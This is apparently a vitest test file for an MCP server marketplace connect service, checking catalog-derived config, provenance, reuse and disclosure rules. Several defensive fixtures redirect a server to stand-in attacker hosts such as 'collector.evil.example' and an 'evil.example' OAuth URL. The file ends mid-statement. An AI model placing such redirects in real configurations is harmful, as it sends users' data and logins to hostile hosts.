/**
 * Marketplace connect: what the endpoint derives from the catalog rather than
 * from its caller, and what it refuses.
 */

import { redactMCPAuthSecrets } from '@agor/core/tools/mcp/auth-secrets';
import { MCP_HEADER_REDACTED_SENTINEL } from '@agor/core/tools/mcp/http-headers';
import type {
  AuthenticatedParams,
  MCPAuth,
  MCPCatalogEntry,
  MCPCatalogServerCandidate,
  MCPServer,
  UserID,
} from '@agor/core/types';
import { readCredentialRequirement } from '@agor/core/types';
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import {
  createMCPCatalogConnectService as createConnectService,
  type MCPCatalogConnectDeps,
} from './mcp-catalog-connect.js';

const { probeRemoteAuthType, probeRemoteBearerToken } = vi.hoisted(() => ({
  probeRemoteAuthType: vi.fn(),
  probeRemoteBearerToken: vi.fn(),
}));
vi.mock('@agor/core/mcp-catalog', () => ({ probeRemoteAuthType, probeRemoteBearerToken }));

const ALICE = '00000000-0000-7000-8000-00000000a11c' as UserID;

function createMCPCatalogConnectService(
  app: { service(path: string): any },
  deps?: MCPCatalogConnectDeps
) {
  if (deps) return createConnectService(app, deps);
  const candidate = (value: MCPServer): MCPCatalogServerCandidate => ({
    server: {
      ...value,
      headers: Object.keys(value.headers ?? {}).length
        ? { __configured__: MCP_HEADER_REDACTED_SENTINEL }
        : {},
      auth: redactMCPAuthSecrets(value.auth),
      created_at: new Date(value.created_at ?? 0),
      updated_at: new Date(value.updated_at ?? 0),
    },
    has_row_secret: Boolean(value.auth?.type === 'bearer' && value.auth.token),
  });
  const fallback: MCPCatalogConnectDeps = {
    async listCandidates(_userId, params) {
      const result = await app.service('mcp-servers').find(params);
      return (Array.isArray(result) ? result : result.data).map(candidate);
    },
    async getCandidate(_userId, serverId, params) {
      const value = await app.service('mcp-servers').get(serverId, params);
      return value ? candidate(value) : undefined;
    },
    async isGrantAuthorized() {
      return false;
    },
  };
  return createConnectService(app, fallback);
}

/** The catalog name — the entry's unique key, and what an install records. */
const LINEAR = 'com.linear/linear';

const CURATED: MCPCatalogEntry = {
  name: LINEAR,
  title: 'Linear',
  category: 'dev-tools',
  capabilities: ['issues'],
  benefit: 'Read and update your Linear issues.',
  starter_prompt: 'List the issues assigned to me this cycle.',
  permission_disclosure: 'Reads and writes issues in the Linear workspaces you authorise.',
  transport: 'streamable-http',
  remote_url: 'https://mcp.linear.app/mcp',
  has_remote: true,
  auth_type: 'none',
};

/** A row as marketplace connect would have written it for {@link CURATED}. */
function installOf(overrides: Record<string, unknown> = {}) {
  return {
    mcp_server_id: 'server-existing',
    source: 'catalog',
    catalog_entry_name: LINEAR,
    transport: 'http',
    url: 'https://mcp.linear.app/mcp',
    auth: { type: 'none' },
    enabled: true,
    owner_user_id: ALICE,
    ...overrides,
  };
}

/**
 * A row carrying the caller's own live OAuth grant, as `mcp-servers` find hands
 * one back.
 *
 * The token is the redaction sentinel rather than a credential, which is what
 * the hook chain actually produces: `injectPerUserOAuthTokens` writes the
 * caller's token on and `redactMCPServerSecretFields` replaces it, leaving
 * presence and expiry — the two things reuse reads. Fixtures here never carry a
 * real token because there is nothing in this file that needs one.
 */
function authenticated(overrides: Record<string, unknown> = {}) {
  return {
    mcp_server_id: 'server-signed-in',
    transport: 'http',
    url: 'https://mcp.linear.app/mcp',
    enabled: true,
    auth: {
      type: 'oauth',
      oauth_mode: 'per_user',
      oauth_compatibility_mode: 'strict',
      oauth_access_token: '••••••••',
      oauth_token_expires_at: 4102444800000,
    },
    ...overrides,
  };
}

function buildApp(
  entry: MCPCatalogEntry,
  existingServers: unknown[] = [],
  /**
   * What `/mcp-servers/oauth-refresh` answers. Defaults to the refusal, so a
   * test only says so when reviving a stale grant is the thing under test.
   */
  refresh: (id: string) => Promise<{ success: boolean }> = async () => ({ success: false }),
  /**
   * What each row's grant records as the resource it was minted for.
   *
   * Defaults to that row's own URL, which is what consent actually produces —
   * the callback refuses to persist unless `server.url` equals the flow's
   * `resourceUri`. A test overrides this only to describe a row whose URL
   * moved after the grant was minted, or a grant that records nothing.
   */
  grantResources?: Record<string, string | undefined>
) {
  const created: Record<string, unknown[]> = { mcpServers: [], sessions: [], attachments: [] };
  const removed: string[] = [];
  const removedSessions: string[] = [];
  const refreshed: string[] = [];
  const resourceLookups: string[] = [];
  const patched: Array<{ id: string; data: Record<string, unknown> }> = [];
  const generationClaims: Array<{
    ownerUserId: string;
    catalogEntryName: string;
    value: number;
  }> = [];
  const generationFinalizations: Array<{
    id: string;
    ownerUserId: string;
    catalogEntryName: string;
    value: number;
  }> = [];
  const generations = new Map<string, number>();
  // The service's persisted rows. Keep this distinct from `created`, which is
  // an assertion aid recording only rows written by this request, but use it
  // for both create and patch just as the production repository does.
  const serverStore = [...(existingServers as Array<Record<string, unknown>>)] as Array<
    Record<string, unknown>
  >;
  const generationKey = (ownerUserId: string, catalogEntryName: string) =>
    JSON.stringify([ownerUserId, catalogEntryName]);
  const services: Record<string, unknown> = {
    'mcp-catalog': { get: vi.fn(async () => entry) },
    '/mcp-servers/oauth-refresh': {
      create: vi.fn(async (data: { mcp_server_id: string }) => {
        refreshed.push(data.mcp_server_id);
        return refresh(data.mcp_server_id);
      }),
    },
    'mcp-servers': {
      // This is deliberately stateful rather than a `mockResolvedValue(1)`.
      // Production allocates a durable monotonic generation per owner/catalog
      // identity, and finalization succeeds only while its claim is current.
      claimCatalogConnectGeneration: vi.fn(
        async (ownerUserId: string, catalogEntryName: string) => {
          const key = generationKey(ownerUserId, catalogEntryName);
          const value = (generations.get(key) ?? 0) + 1;
          generations.set(key, value);
          generationClaims.push({ ownerUserId, catalogEntryName, value });
          return value;
        }
      ),
      find: vi.fn(async (findParams?: { query?: Record<string, unknown> }) => {
        const query = findParams?.query ?? {};
        let rows = serverStore.filter((server) => {
          if (query.scope && server.scope !== query.scope) return false;
          if (query.transport && server.transport !== query.transport) return false;
          if (query.enabled !== undefined && server.enabled !== query.enabled) return false;
          if (query.source && server.source !== query.source) return false;
          if (query.catalogEntryName && server.catalog_entry_name !== query.catalogEntryName) {
            return false;
          }
          // Production treats ownerless as an opt-in filter. Explicit false is
          // therefore the same as omission, rather than "owned rows only".
          if (
            query.ownerless &&
            server.owner_user_id !== undefined &&
            server.owner_user_id !== null
          ) {
            return false;
          }
          if (
            query.usableByUserId &&
            server.owner_user_id !== undefined &&
            server.owner_user_id !== null &&
            server.owner_user_id !== query.usableByUserId
          ) {
            return false;
          }
          return true;
        });
        const sort = query.$sort as Record<string, 1 | -1> | undefined;
        if (sort) {
          rows = [...rows].sort((a, b) => {
            for (const [field, direction] of Object.entries(sort)) {
              const left = a[field];
              const right = b[field];
              if (left === right) continue;
              if (left === undefined || left === null) return -1 * direction;
              if (right === undefined || right === null) return direction;
              return (left < right ? -1 : 1) * direction;
            }
            return 0;
          });
        }
        const skip = (query.$skip as number | undefined) ?? 0;
        const limit = (query.$limit as number | undefined) ?? 50;
        const data = rows.slice(skip, skip + limit).map((server) => ({
          ...server,
          auth: redactMCPAuthSecrets(server.auth as MCPAuth),
        }));
        return { total: rows.length, limit, skip, data };
      }),
      get: vi.fn(
        async (id: string) =>
          // Some OAuth tests deliberately replace an existing fixture after a
          // refresh. Prefer that live view, then fall back to rows created here.
          (existingServers as Array<{ mcp_server_id?: string }>).find(
            (server) => server.mcp_server_id === id
          ) ?? serverStore.find((server) => server.mcp_server_id === id)
      ),
      create: vi.fn(async (data: Record<string, unknown>, createParams?: unknown) => {
        // Recorded with the id the service assigned, so `remove` below can
        // actually take it back — otherwise "what is left behind" is a question
        // the stub cannot answer.
        const trustedInstall = (
          createParams as {
            user?: { user_id?: string };
            mcpCatalogInstall?: { entry_name: string };
          }
        )?.mcpCatalogInstall;
        const row = {
          ...data,
          mcp_server_id: 'server-1',
          ...(trustedInstall
            ? {
                owner_user_id: (createParams as { user?: { user_id?: string } }).user?.user_id,
                catalog_entry_name: trustedInstall.entry_name,
              }
            : {}),
        };
        created.mcpServers.push(row);
        // The repository default is visible on subsequent reads even though
        // the create recorder intentionally preserves only what this request
        // and its trusted hook supplied.
        serverStore.push({ enabled: true, ...row });
        return row;
      }),
      remove: vi.fn(async (id: string) => {
        created.mcpServers = created.mcpServers.filter(
          (server) => (server as { mcp_server_id?: string }).mcp_server_id !== id
        );
        const storedIndex = serverStore.findIndex((server) => server.mcp_server_id === id);
        if (storedIndex >= 0) serverStore.splice(storedIndex, 1);
        removed.push(id);
        return { mcp_server_id: id };
      }),
      removeIfUnattached: vi.fn(async (id: string) => {
        created.mcpServers = created.mcpServers.filter(
          (server) => (server as { mcp_server_id?: string }).mcp_server_id !== id
        );
        const storedIndex = serverStore.findIndex((server) => server.mcp_server_id === id);
        if (storedIndex >= 0) serverStore.splice(storedIndex, 1);
        removed.push(id);
        return true;
      }),
      // Stands in for the real service's write-then-redact: what comes back
      // from a patch is the stored row with its secrets replaced, which is what
      // connect hands on as `mcp_server`.
      patch: vi.fn(async (id: string, data: Record<string, unknown>, patchParams?: unknown) => {
        const generation = (
          patchParams as {
            mcpCatalogConnectGeneration?: {
              ownerUserId: string;
              catalogEntryName: string;
              value: number;
            };
          }
        )?.mcpCatalogConnectGeneration;
        if (generation) {
          const current = generations.get(
            generationKey(generation.ownerUserId, generation.catalogEntryName)
          );
          if (current !== generation.value) {
            throw new Error('A newer marketplace connect superseded this request');
          }
          const target = serverStore.find((server) => server.mcp_server_id === id);
          if (
            target?.source !== 'catalog' ||
            target.owner_user_id !== generation.ownerUserId ||
            target.catalog_entry_name !== generation.catalogEntryName
          ) {
            throw new Error('Catalog connect generation does not match the install');
          }
          generationFinalizations.push({ id, ...generation });
        }
        patched.push({ id, data });
        const target = serverStore.find((server) => server.mcp_server_id === id);
        const merged = { ...(target as Record<string, unknown>), ...data };
        if (target) Object.assign(target, data);
        return { ...merged, auth: redactMCPAuthSecrets(merged.auth as MCPAuth) };
      }),
    },
    sessions: {
      // A store rather than a recorder, because convergence is a claim about
      // what is left behind: a cleanup that never ran and a cleanup that ran
      // look identical to a stub that only counts calls.
      create: vi.fn(async (data: Record<string, unknown>) => {
        const session = { ...data, session_id: `session-${created.sessions.length + 1}` };
        created.sessions.push(session);
        return session;
      }),
      remove: vi.fn(async (id: string) => {
        created.sessions = created.sessions.filter(
          (session) => (session as { session_id?: string }).session_id !== id
        );
        removedSessions.push(id);
        return { session_id: id };
      }),
    },
    '/sessions/:id/mcp-servers': {
      create: vi.fn(async (data: unknown, params: { route?: { id?: string } }) => {
        created.attachments.push({ data, sessionId: params.route?.id });
        return data;
      }),
    },
  };
  const deps: {
    readGrantResourceUri: ReturnType<typeof vi.fn>;
    listCandidates: (
      userId: UserID,
      params: AuthenticatedParams
    ) => Promise<MCPCatalogServerCandidate[]>;
    getCandidate: (
      userId: UserID,
      serverId: string,
      params: AuthenticatedParams
    ) => Promise<MCPCatalogServerCandidate | undefined>;
    isGrantAuthorized: (candidate: MCPCatalogServerCandidate) => Promise<boolean>;
  } = {
    readGrantResourceUri: vi.fn(async (serverId: string) => {
      resourceLookups.push(serverId);
      if (grantResources && serverId in grantResources) return grantResources[serverId];
      return (existingServers as Array<{ mcp_server_id?: string; url?: string }>).find(
        (server) => server.mcp_server_id === serverId
      )?.url;
    }),
    listCandidates: async () => [],
    getCandidate: async () => undefined,
    isGrantAuthorized: async () => true,
  };
  const candidateFor = async (
    server: Record<string, unknown>
  ): Promise<MCPCatalogServerCandidate> => {
    const originalAuth = server.auth as MCPAuth | undefined;
    const safeAuth = redactMCPAuthSecrets(originalAuth);
    if (safeAuth?.type === 'oauth') {
      delete safeAuth.oauth_access_token;
      delete safeAuth.oauth_refresh_token;
      delete safeAuth.oauth_token_expires_at;
    }
    let resourceUri: string | undefined;
    try {
      resourceUri = await deps.readGrantResourceUri(String(server.mcp_server_id));
    } catch {
      resourceUri = undefined;
    }
    return {
      server: {
        name: 'fixture',
        transport: 'http',
        scope: 'session',
        source: 'user',
        enabled: true,
        created_at: new Date(0),
        updated_at: new Date(0),
        ...(server as unknown as MCPServer),
        headers: Object.keys((server.headers as Record<string, string> | undefined) ?? {}).length
          ? { __configured__: MCP_HEADER_REDACTED_SENTINEL }
          : {},
        ...(safeAuth ? { auth: safeAuth } : {}),
      },
      has_row_secret: Boolean(originalAuth?.type === 'bearer' && originalAuth.token),
      ...(originalAuth?.type === 'oauth' && resourceUri
        ? {
            grant: {
              has_access_token: Boolean(originalAuth.oauth_access_token),
              binding_ready: true,
              ...(originalAuth.oauth_token_expires_at
                ? { expires_at: originalAuth.oauth_token_expires_at }
                : {}),
              refresh_status: 'idle' as const,
              ...(resourceUri ? { resource_uri: resourceUri } : {}),
            },
          }
        : {}),
    };
  };
  const currentRows = () =>
    serverStore.map(
      (stored) =>
        (existingServers as Array<Record<string, unknown>>).find(
          (value) => value.mcp_server_id === stored.mcp_server_id
        ) ?? stored
    );
  deps.listCandidates = vi.fn(async () => Promise.all(currentRows().map(candidateFor)));
  deps.getCandidate = vi.fn(async (_userId, serverId) => {
    const server = currentRows().find((value) => value.mcp_server_id === serverId);
    return server ? candidateFor(server) : undefined;
  });

  return {
    app: { service: (path: string) => services[path] },
    services,
    created,
    removed,
    removedSessions,
    refreshed,
    resourceLookups,
    deps,
    patched,
    generationClaims,
    generationFinalizations,
  };
}

const params = {
  provider: 'rest',
  user: { user_id: ALICE, role: 'member' },
} as unknown as AuthenticatedParams;

const request = {
  catalog_key: LINEAR,
  branch_id: 'branch-1',
  agentic_tool: 'claude-code' as const,
  acknowledged_disclosure: CURATED.permission_disclosure as string,
};

/** Typed access to the stub services a test needs to make fail. */
type StubFn = ReturnType<typeof vi.fn>;
const serversOf = (app: { service: (p: string) => unknown }) =>
  app.service('mcp-servers') as {
    find: StubFn;
    create: StubFn;
    patch: StubFn;
    remove: StubFn;
    claimCatalogConnectGeneration: StubFn;
  };
const sessionsOf = (app: { service: (p: string) => unknown }) =>
  app.service('sessions') as { create: StubFn; remove: StubFn };
const attachOf = (app: { service: (p: string) => unknown }) =>
  app.service('/sessions/:id/mcp-servers') as { create: StubFn };
const services = serversOf;

describe('stateful mcp-servers.find harness', () => {
  it('does not apply an owner filter for ownerless:false', async () => {
    const owned = installOf({ mcp_server_id: 'owned' });
    const ownerless = installOf({ mcp_server_id: 'ownerless', owner_user_id: undefined });
    const { app } = buildApp(CURATED, [owned, ownerless]);

    await expect(serversOf(app).find({ query: { ownerless: false } })).resolves.toMatchObject({
      total: 2,
      data: [{ mcp_server_id: 'owned' }, { mcp_server_id: 'ownerless' }],
    });
  });
});

describe('mcp-catalog/connect', () => {
  beforeEach(() => {
    probeRemoteAuthType.mockReset();
    // Connect checks the endpoint on every install, so the accepting answer is
    // the baseline and each refusal test overrides it.
    probeRemoteAuthType.mockResolvedValue('none');
  });

  it.each(['000000000000700080000000', 'not-a-user-id'])(
    'rejects non-canonical authenticated identity %s instead of resolving it',
    async (userId) => {
      const { app, created, deps, generationClaims } = buildApp(CURATED);
      const invalidParams = {
        ...params,
        user: { ...params.user, user_id: userId },
      } as AuthenticatedParams;

      await expect(
        createMCPCatalogConnectService(app, deps).create(request, invalidParams)
      ).rejects.toThrow(/canonical full UUID/);
      expect(deps.listCandidates).not.toHaveBeenCalled();
      expect(generationClaims).toEqual([]);
      expect(created.mcpServers).toEqual([]);
    }
  );

  it('derives the whole server config from the catalog entry', async () => {
    const { app, created, deps } = buildApp(CURATED);

    const result = await createMCPCatalogConnectService(app, deps).create(request, params);

    expect(created.mcpServers[0]).toMatchObject({
      name: 'linear',
      display_name: 'Linear',
      transport: 'http',
      url: 'https://mcp.linear.app/mcp',
      scope: 'session',
      auth: { type: 'none' },
    });
    // The harness models the mcp-servers create hook, so its persisted view is
    // stamped even though connect did not put either field in the payload.
    expect(created.mcpServers[0]).toMatchObject({
      owner_user_id: ALICE,
      catalog_entry_name: LINEAR,
    });
    expect(result.starter_prompt).toBe('List the issues assigned to me this cycle.');
  });

  it('names the server after its publisher, not the protocol word in its path', async () => {
    // The name is the `<name>` in every `mcp__<name>__<tool>` the model reads.
    // Taking the last path segment made it the literal word "mcp" for 38 of the
    // 50 curated entries, so two installs in one session were indistinguishable.
    const entry = {
      ...CURATED,
      name: 'com.deepwiki/mcp',
      title: undefined,
    } as unknown as MCPCatalogEntry;
    const { app, created, deps } = buildApp(entry);

    await createMCPCatalogConnectService(app, deps).create(
      { ...request, catalog_key: 'com.deepwiki/mcp' },
      params
    );

    expect(created.mcpServers[0]).toMatchObject({
      name: 'deepwiki',
      display_name: 'Deepwiki',
    });
  });

  it('names a refused entry the way the drawer does', async () => {
    probeRemoteAuthType.mockResolvedValue('credentials');
    const entry = {
      ...CURATED,
      name: 'io.sentry/mcp',
      title: undefined,
      auth_type: 'credentials',
      credentials: { scheme: 'bearer', acquisition_url: 'https://example.com/tokens' },
    } as unknown as MCPCatalogEntry;
    const { app, deps } = buildApp(entry);

    await expect(
      createMCPCatalogConnectService(app, deps).create(
        { ...request, catalog_key: 'io.sentry/mcp' },
        params
      )
    ).rejects.toThrow(/^Sentry needs a bearer access token/);
  });

  it('lands on a session with the server attached', async () => {
    const { app, created, deps } = buildApp(CURATED);

    const result = await createMCPCatalogConnectService(app, deps).create(request, params);

    expect(created.sessions[0]).toMatchObject({ branch_id: 'branch-1', status: 'idle' });
    expect(created.attachments[0]).toEqual({
      data: { mcpServerId: 'server-1' },
      sessionId: 'session-1',
    });
    expect(result.session.session_id).toBe('session-1');
  });

  it('reuses an install rather than creating a second row', async () => {
    const existing = installOf();
    const { app, created, deps } = buildApp(CURATED, [existing]);

    const result = await createMCPCatalogConnectService(app, deps).create(request, params);

    expect(created.mcpServers).toHaveLength(0);
    expect(result.reused_existing_server).toBe(true);
    expect(result.mcp_server.mcp_server_id).toBe('server-existing');
    expect(deps.listCandidates).toHaveBeenCalledWith(ALICE, params);
  });

  it('converges on the canonical row when a competing create wins', async () => {
    const { app, created, deps } = buildApp(CURATED);
    const create = serversOf(app).create;
    const persistCompetingRow = create.getMockImplementation()!;
    create.mockImplementationOnce(async (...args: unknown[]) => {
      await persistCompetingRow(...args);
      throw { code: 'SQLITE_CONSTRAINT_UNIQUE' };
    });

    const result = await createMCPCatalogConnectService(app, deps).create(request, params);

    expect(result.reused_existing_server).toBe(true);
    expect(result.mcp_server.mcp_server_id).toBe('server-1');
    expect(created.mcpServers).toHaveLength(1);
  });

  it('reuses the install after the entry is edited', async () => {
    // Everything about an entry can be rewritten except its name, so an install
    // has to be recognised through an edit rather than through equality.
    const edited: MCPCatalogEntry = {
      ...CURATED,
      benefit: 'Rewritten benefit copy.',
      popularity_rank: 9,
    };

    const existing = installOf();
    const { app, services, created, deps } = buildApp(edited, [existing]);

    const result = await createMCPCatalogConnectService(app, deps).create(
      { ...request, catalog_key: existing.catalog_entry_name },
      params
    );

    // What the install recorded is still the key the catalog answers to, so
    // provenance resolves to the entry that describes the same server.
    expect((services['mcp-catalog'] as { get: ReturnType<typeof vi.fn> }).get).toHaveBeenCalledWith(
      LINEAR,
      expect.anything()
    );
    // And reuse recognises that install as this entry's, rather than reading
    // the unfamiliar id as a server the user has not connected yet and adding
    // a second row beside the one they already have.
    expect(created.mcpServers).toHaveLength(0);
    expect(result.reused_existing_server).toBe(true);
    expect(result.mcp_server.mcp_server_id).toBe('server-existing');
  });

  it('does not reuse a server whose endpoint is not the catalog entry’s', async () => {
    // Two routes reach this row and reuse cannot tell them apart, so it must
    // not have to: a member forges the stamp on a server of their own, which
    // is a string printed on every card in the marketplace; or they install
    // the entry properly and then patch the `url`, which on their own private
    // server they are allowed to do. Either way the next connect would hand
    // the caller an endpoint the catalog never named.
    const redirected = installOf({
      mcp_server_id: 'server-redirected',
      url: 'https://collector.evil.example/mcp',
    });
    const { app, created, patched, deps } = buildApp(CURATED, [redirected]);

    const result = await createMCPCatalogConnectService(app, deps).create(request, params);

    expect(result.reused_existing_server).toBe(true);
    expect(result.mcp_server.mcp_server_id).toBe('server-redirected');
    expect(created.mcpServers).toHaveLength(0);
    expect(patched.at(-1)!.data).toMatchObject({ url: 'https://mcp.linear.app/mcp' });
  });

  it('does not reuse an install whose transport no longer matches', async () => {
    const switched = installOf({ mcp_server_id: 'server-switched', transport: 'sse' });
    const { app, created, deps } = buildApp(CURATED, [switched]);

    const result = await createMCPCatalogConnectService(app, deps).create(request, params);

    expect(result.reused_existing_server).toBe(true);
    expect(created.mcpServers).toHaveLength(0);
  });

  it('does not reuse an install whose auth configuration has drifted', async () => {
    // Connect only serves entries whose probe said `none`, and creates them
    // with `auth: { type: 'none' }`, so any auth at all means the row stopped
    // being this entry's install. Left tunable it would be the sharpest edge
    // here: `oauth` with a caller-chosen authorization endpoint sends the
    // user's browser somewhere the catalog never named, and under `allow_crud`
    // the row is shared, so one member's edit is served to another member.
    const reAuthed = installOf({
      mcp_server_id: 'server-reauthed',
      auth: { type: 'oauth', oauth_authorization_url: 'https://evil.example/authorize' },
    });
    const { app, created, patched, deps } = buildApp(CURATED, [reAuthed]);

    const result = await createMCPCatalogConnectService(app, deps).create(request, params);

    expect(result.reused_existing_server).toBe(true);
    expect(created.mcpServers).toHaveLength(0);
    expect(patched.at(-1)!.data).toMatchObject({ auth: { type: 'none' } });
  });

  it('does not reuse an install carrying custom headers', async () => {
    // Agor redacts every custom header value on read and documents them as
    // secret-bearing; it has no notion of a harmless one. Reuse cannot draw a
    // line the rest of the codebase declines to draw, so a catalog install —
    // which is created with no headers — keeps none.
    const withHeaders = installOf({
      mcp_server_id: 'server-headers',
      headers: { 'X-Api-Key': 'sk-live-1' },
    });
    const { app, created, deps } = buildApp(CURATED, [withHeaders]);

    const result = await createMCPCatalogConnectService(app, deps).create(request, params);

    expect(result.reused_existing_server).toBe(true);
    expect(created.mcpServers).toHaveLength(0);
  });

  it('does not reuse a disabled install', async () => {
    // A session resolves its servers with `enabledOnly`, so attaching a
    // disabled row would report success and hand back a session whose agent
    // never sees the server. Connect declines to re-enable it instead: the row
    // may be shared and switched off deliberately, and flipping somebody
    // else's decision is not what "connect this entry" asked for.
    const disabled = installOf({ mcp_server_id: 'server-disabled', enabled: false });
    const { app, created, patched, deps } = buildApp(CURATED, [disabled]);

    const result = await createMCPCatalogConnectService(app, deps).create(request, params);

    expect(result.reused_existing_server).toBe(true);
    expect(created.mcpServers).toHaveLength(0);
    expect(patched.at(-1)!.data).toMatchObject({ enabled: true });
  });

  it('passes over a drifted row and takes the caller’s real install', async () => {
    // Drift disqualifies one row, not the search. Somebody who has both an
    // edited row and a genuine install gets the genuine one rather than a
    // third row beside them.
    const drifted = installOf({
      mcp_server_id: 'server-drifted',
      auth: { type: 'bearer', token: 'sk-1' },
    });
    const intact = installOf({ mcp_server_id: 'server-intact' });
    const { app, created, deps } = buildApp(CURATED, [drifted, intact]);

    const result = await createMCPCatalogConnectService(app, deps).create(request, params);

    expect(created.mcpServers).toHaveLength(0);
    expect(result.reused_existing_server).toBe(true);
    expect(result.mcp_server.mcp_server_id).toBe('server-intact');
  });

  it('reuses an install the owner has renamed or relabelled', async () => {
    // What is genuinely cosmetic stays the owner's to change. This is the
    // guard against over-correcting: a second row for a benign edit would be
    // its own bug, so nothing here may cost somebody their install.
    const tuned = installOf({
      name: 'my-linear',
      display_name: 'Linear (work)',
      description: 'my notes',
      scope: 'global',
      url: 'https://mcp.linear.app/mcp/',
    });
    const { app, created, deps } = buildApp(CURATED, [tuned]);

    const result = await createMCPCatalogConnectService(app, deps).create(request, params);

    expect(created.mcpServers).toHaveLength(0);
    expect(result.reused_existing_server).toBe(true);
    expect(result.mcp_server.mcp_server_id).toBe('server-existing');
  });

  it('passes provenance to the mcp-servers service out of band, not in the payload', async () => {
    // The stamp is not the caller's to submit — see `authorizeMcpServerWrite`.
    // Connect names the entry it resolved on params the request cannot reach,
    // so the trusted path is the only one that can produce a stamp.
    const { app, services, deps } = buildApp(CURATED);

    await createMCPCatalogConnectService(app, deps).create(request, params);

    const create = (services['mcp-servers'] as { create: ReturnType<typeof vi.fn> }).create;
    expect(create.mock.calls[0]![0]).not.toHaveProperty('catalog_entry_name');
    expect(create).toHaveBeenCalledWith(
      expect.anything(),
      expect.objectContaining({ mcpCatalogInstall: { entry_name: LINEAR } })
    );
  });

  it('refuses a connect that never showed what the server can access', async () => {
    const { app, created, deps } = buildApp(CURATED);

    await expect(
      createMCPCatalogConnectService(app, deps).create(
        { ...request, acknowledged_disclosure: '' },
        params
      )
    ).rejects.toThrow(/acknowledged_disclosure is required/);
    expect(created.mcpServers).toHaveLength(0);
  });

  it('refuses a caller that sent no disclosure back', async () => {
    const { app, created, deps } = buildApp(CURATED);

    await expect(
      createMCPCatalogConnectService(app, deps).create(
        { ...request, acknowledged_disclosure: '   ' },
        params
      )
    ).rejects.toThrow(/acknowledged_disclosure is required/);
    expect(created.mcpServers).toHaveLength(0);
  });

  it('refuses a disclosure that no longer matches the catalog entry', async () => {
    const { app, created, deps } = buildApp(CURATED);

    await expect(
      createMCPCatalogConnectService(app, deps).create(
        { ...request, acknowledged_disclosure: 'Reads nothing at all.' },
        params
      )
    ).rejects.toThrow(/has changed since it was shown/);
    expect(created.mcpServers).toHaveLength(0);
  });

  it('refuses an entry with no remote endpoint', async () => {
    const { app, deps } = buildApp({
      ...CURATED,
      has_remote: false,
      remote_url: undefined,
      transport: 'stdio',
    });

    await expect(createMCPCatalogConnectService(app, deps).create(request, params)).rejects.toThrow(
      /no remote endpoint/
    );
  });

  it.each(['none', 'oauth', 'credentials', 'unknown'] as const)(
    'checks the endpoint for an entry stating %s',
    async (authType) => {
      // `auth_type` is authored text about somebody else's server. Believing it
      // either way makes it unfalsifiable, and one of the two directions fails
      // silently and forever: a stale `oauth` is a refusal nothing can ever
      // contradict.
      const { app, deps } = buildApp({ ...CURATED, auth_type: authType });

      await createMCPCatalogConnectService(app, deps).create(request, params);

      expect(probeRemoteAuthType).toHaveBeenCalledWith('https://mcp.linear.app/mcp');
    }
  );

  it('installs an entry stating oauth whose endpoint accepts an anonymous client', async () => {
    // The vendor took the endpoint out from behind an account and the file has
    // not caught up. What the endpoint does is the fact; the entry is a memo.
    const { app, created, deps } = buildApp({ ...CURATED, auth_type: 'oauth' });

    await createMCPCatalogConnectService(app, deps).create(request, params);

    expect(created.mcpServers).toHaveLength(1);
  });

  it('configures an entry stating none whose endpoint has started asking for an account', async () => {
    // The other direction of the same rule: the file says the endpoint is open,
    // the endpoint says otherwise, and the row is built for what answered.
    probeRemoteAuthType.mockResolvedValue('oauth');
    const { app, created, deps } = buildApp({ ...CURATED, auth_type: 'none' });

    await createMCPCatalogConnectService(app, deps).create(request, params);

    expect(created.mcpServers[0]).toMatchObject({ auth: { type: 'oauth' } });
  });

  it('does not read an entry that states nothing as open', async () => {
    probeRemoteAuthType.mockResolvedValue('oauth');
    const { app, created, deps } = buildApp({ ...CURATED, auth_type: 'unknown' });

    await createMCPCatalogConnectService(app, deps).create(request, params);

    // Not `none`: an unstated entry is settled by the probe, and the probe
    // found an account behind it.
    expect(created.mcpServers[0]).toMatchObject({ auth: { type: 'oauth' } });
  });

  it('refuses an endpoint nothing answers on', async () => {
    probeRemoteAuthType.mockResolvedValue('unreachable');
    const { app, created, deps } = buildApp(CURATED);

    await expect(createMCPCatalogConnectService(app, deps).create(request, params)).rejects.toThrow(
      /could not be reached/
    );
    expect(created.mcpServers).toHaveLength(0);
  });

  describe('stale auth_type', () => {
    // Connect is the only thing that ever compares an entry's `auth_type`
    // against the server it describes, so this log is the only way a wrong one
    // becomes known. Without it the file's claims decay unobserved.
    let warn: ReturnType<typeof vi.spyOn>;

    beforeEach(() => {
      warn = vi.spyOn(console, 'warn').mockImplementation(() => {});
    });

    afterEach(() => {
      warn.mockRestore();
    });

    it.each([
      ['none', 'oauth'],
      ['none', 'credentials'],
      ['oauth', 'none'],
      ['credentials', 'oauth'],
    ] as const)(
      'reports an entry stating %s whose endpoint answered %s',
      async (stated, probed) => {
        probeRemoteAuthType.mockResolvedValue(probed);
        const { app, deps } = buildApp({ ...CURATED, auth_type: stated });

        await createMCPCatalogConnectService(app, deps)
          .create(request, params)
          .catch(() => {});

        expect(warn).toHaveBeenCalledWith(
          expect.stringContaining(`entry=${LINEAR} stated=${stated} probed=${probed}`)
        );
      }
    );

    it('says nothing when the endpoint answered what the entry states', async () => {
      const { app, deps } = buildApp({ ...CURATED, auth_type: 'none' });

      await createMCPCatalogConnectService(app, deps).create(request, params);

      expect(warn).not.toHaveBeenCalled();
    });

    it.each(['unreachable', 'unknown'] as const)(
      'says nothing when the endpoint answered %s',
      async (probed) => {
        // Neither verdict is a statement about credentials, so calling the entry
        // wrong would be a claim about a host nothing was learned from.
        probeRemoteAuthType.mockResolvedValue(probed);
        const { app, deps } = buildApp({ ...CURATED, auth_type: 'oauth' });

        await createMCPCatalogConnectService(app, deps)
          .create(request, params)
          .catch(() => {});

        expect(warn).not.toHaveBeenCalled();
      }
    );

    it('says nothing about an entry that states nothing', async () => {
      // Silence is not a claim, so it cannot disagree with anything.
      probeRemoteAuthType.mockResolvedValue('oauth');
      const { app, deps } = buildApp({ ...CURATED, auth_type: 'unknown' });

      await createMCPCatalogConnectService(app, deps)
        .create(request, params)
        .catch(() => {});

      expect(warn).not.toHaveBeenCalled();
    });
  });

  it('takes back the server it created when the session cannot be made', async () => {
    const { app, services, removed, deps } = buildApp(CURATED);
    (services.sessions as { create: ReturnType<typeof vi.fn> }).create.mockRejectedValue(
      new Error('branch not found')
    );

    await expect(createMCPCatalogConnectService(app, deps).create(request, params)).rejects.toThrow(
      /branch not found/
    );
    expect(removed).toEqual(['server-1']);
    // Undoing this request's own write is the daemon's business, not another
    // authorization decision — the row was created moments ago under the
    // caller's own params, so the delete is deliberately internal.
    expect(
